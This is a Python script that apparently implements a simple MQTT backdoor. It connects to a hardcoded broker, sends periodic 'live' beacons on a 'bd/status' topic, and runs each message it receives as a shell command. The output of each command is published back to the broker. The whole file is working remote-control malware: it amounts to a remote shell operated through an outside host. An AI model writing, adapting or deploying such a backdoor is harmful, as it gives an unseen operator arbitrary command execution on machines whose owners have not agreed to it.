##!/usr/bin/env python

import paho.mqtt.client as mqtt
import paho.mqtt.publish as publish
import random
import time
import threading
import socket,subprocess


#######################################
# -------------------------------------------------
#
# MQTT  server details
# ------------------------------------------------
#######################################
broker_addr = "192.168.101.113"
broker_port = 1883
topic_publish_status = "bd/status"
toipc_publish_result = "bd/result"
topic_subscribe = "user1"
live_interval = 5
#######################################
#---------------------------------------------------
#
# Class that sends status //MQTT Reciver too
#
#---------------------------------------------------
class run_mqtt(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
        self.daemon = True
        self.start()
    
    def run(self):   
        client = mqtt.Client()
        client.on_connect = on_connect
        client.on_message = on_message
        try:
            
            client.connect(broker_addr, broker_port, 60)
            
            # Blocking call that processes network traffic, dispatches callbacks and
            # handles reconnecting.
            # Other loop*() functions are available that give a threaded interface and a
            # manual interface.
            client.loop_start()
            while True:
                global live_interval
                send(":s:live",topic_publish_status)
                time.sleep(live_interval)
        except Exception as e:
            print(e)
            pass
      
def on_connect(client, userdata, flags, rc):
    #print("Connected with result code "+str(rc))
    # Subscribing in on_connect() means that if we lose the connection and
    # reconnect then subscriptions will be renewed.
    try:
        client.subscribe(topic_subscribe)
    except Exception as e:
        print(e)
        pass
    # The callback for when a PUBLISH message is received from the server.
    
def on_message(client, userdata, msg):
    try:
        # print(msg.payload)
        message = str(msg.payload.decode('utf-8'))
        print(message)
        proc = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        # read output
        stdout_value = str(proc.stdout.read().decode("utf-8")) + str(proc.stderr.read().decode("utf-8"))
        
        send(str(stdout_value),toipc_publish_result)
        command_msg = message.lower()
        # a = subprocess.check_output(message, shell=True).decode('utf-8')
        # print(a)
        # send(str(a), toipc_publish_result)
        
    except Exception as e:
        print(e)
        pass


def send(msg,publish_t):
    try:
        publish.single(publish_t, msg, hostname=broker_addr)
    except Exception as e:
        print(e)
        pass
    
run_mqtt()
while True:
    a = 1
    